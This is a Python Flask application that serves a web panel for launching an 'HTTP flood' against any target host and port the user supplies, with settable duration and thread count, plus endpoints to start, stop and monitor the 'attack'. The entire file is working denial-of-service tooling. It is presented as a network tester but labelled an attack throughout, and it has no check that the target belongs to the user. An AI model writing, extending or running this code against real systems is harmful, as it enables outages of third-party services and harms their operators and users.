from flask import Flask, render_template, request, jsonify
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
import requests

app = Flask(__name__)

# Store attack status globally (in production, use a database)
attack_status = {
    'is_running': False,
    'requests_sent': 0,
    'successful_requests': 0,
    'failed_requests': 0
}

class WebNetworkTester:
    def __init__(self):
        self.is_testing = False
        
    def ultra_http_flood(self, target, port, duration, threads_count):
        """HTTP Flood for web version"""
        end_time = time.time() + duration
        request_count = 0
        
        def worker():
            nonlocal request_count
            while time.time() < end_time and self.is_testing:
                try:
                    # Simple HTTP request
                    response = requests.get(f"http://{target}:{port}/", timeout=2)
                    request_count += 1
                    attack_status['successful_requests'] += 1
                except:
                    attack_status['failed_requests'] += 1
                attack_status['requests_sent'] += 1
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = [executor.submit(worker) for _ in range(threads_count)]
            for future in futures:
                future.result()
        
        return request_count

tester = WebNetworkTester()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target = data['target']
    port = int(data['port'])
    duration = int(data['duration'])
    threads = int(data['threads'])
    method = data['method']
    
    # Reset status
    attack_status.update({
        'is_running': True,
        'requests_sent': 0,
        'successful_requests': 0,
        'failed_requests': 0
    })
    
    # Start attack in background thread
    def run_attack():
        tester.is_testing = True
        if method == 'http_flood':
            tester.ultra_http_flood(target, port, duration, threads)
        tester.is_testing = False
        attack_status['is_running'] = False
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'Attack started'})

@app.route('/attack_status')
def get_attack_status():
    return jsonify(attack_status)

@app.route('/stop_attack')
def stop_attack():
    tester.is_testing = False
    attack_status['is_running'] = False
    return jsonify({'status': 'Attack stopped'})

if __name__ == '__main__':
    app.run(debug=True)